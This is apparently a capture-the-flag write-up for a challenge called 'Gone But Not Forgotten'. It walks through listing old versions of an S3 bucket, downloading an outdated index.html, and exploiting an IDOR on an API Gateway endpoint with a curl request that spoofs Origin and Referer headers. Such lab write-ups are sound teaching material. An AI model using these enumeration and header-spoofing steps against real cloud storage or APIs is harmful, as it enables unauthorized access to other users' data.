# Challenge Walkthrough: Gone But Not Forgotten

## Challenge Description

Players are presented with a CTF forum application. The goal is to discover the previous bucket version, download it, and read it to learn the details of an old endpoint which uses IDOR.

---

# Solution Path

## Step 1: Bucket Identification

During initial reconnaissance of the web application, the player inspects the page resources, network traffic, or environment exposure and uncovers the name of the Amazon S3 bucket:

```text
gone-but-not-forgotten-195729561860-us-east-1-an
```

---

## Step 2: Querying Object Versions

The player checks the bucket for object versioning configuration. Realizing that versioning is enabled, they run a command to list all historical versions of the objects within the bucket to check for modified or deleted files. NOTE: During the challenge, the public did not have permission to list the bucket versions, which made the challenge not work. 

```bash
aws s3api list-object-versions \
    --bucket gone-but-not-forgotten-195729561860-us-east-1-an
```

They get outdated versionId:

```text
.QS74MJ3NzUQpwAcU0U_S0T9B.1lpbfs
```

---

## Step 3: Fetching the Outdated Source

Using the discovered version ID, the player downloads the older asset to inspect what changed between deployments.

```bash
aws s3api get-object \
    --bucket gone-but-not-forgotten-195729561860-us-east-1-an \
    --key index.html \
    --version-id .QS74MJ3NzUQpwAcU0U_S0T9B.1lpbfs \
    output_file.txt
```

---

## Step 4: Analyzing the Code & API Flaw

Reviewing the old `index.html`, the player notices an outdated frontend script targeting an Amazon API Gateway endpoint:

```javascript
const API_BASE = "https://xxew1bus4j.execute-api.us-east-1.amazonaws.com/prod";
```

The code reveals that the notes feature queries the backend using a simple query parameter:

```text
/ctf-note-retrieval?userId=ctf-player
```

---

## Step 5: Insecure Direct Object Reference (IDOR)

The player observes that the old endpoint uses insecure direct object reference. 

By modifying the request parameter to target the administrator or primary user account (`userId=1`), the player can execute an IDOR attack to retrieve unauthorized notes and capture the flag.

They also see the comment "//NOTE: API restricted to requests from this domain only" and learn that the endpoint attempts to enforce validation using CORS. The user gets the flag by constructing a request resembling this one:

curl \
  -H "Origin: http://gone-but-not-forgotten-195729561860-us-east-1-an.s3-website-us-east-1.amazonaws.com" \
  -H "Referer: http://gone-but-not-forgotten-195729561860-us-east-1-an.s3-website-us-east-1.amazonaws.com/" \
  "https://xxew1bus4j.execute-api.us-east-1.amazonaws.com/prod/ctf-note-retrieval?userId=1"    

